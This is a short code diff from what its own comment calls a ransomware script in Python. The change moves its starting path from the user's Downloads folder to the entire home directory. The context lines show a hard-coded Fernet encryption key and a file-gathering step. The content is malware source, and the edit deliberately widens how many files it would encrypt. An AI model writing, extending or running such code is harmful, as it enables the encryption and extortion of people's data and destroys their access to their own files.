@@ -31,7 +31,7 @@ def showMenu():
 print('Calculating number of files..')
 #Configure starting path of the ransomware
 path = Path(Path.home()).absolute()
-foldername = path / 'Downloads'
+foldername = path
 files = getFiles(foldername)
 #Cryptography key
 fernet = Fernet('bjq5lagsjEDIvxmWM6badVWEFD4wSGVatHaSCoYZqeI=')
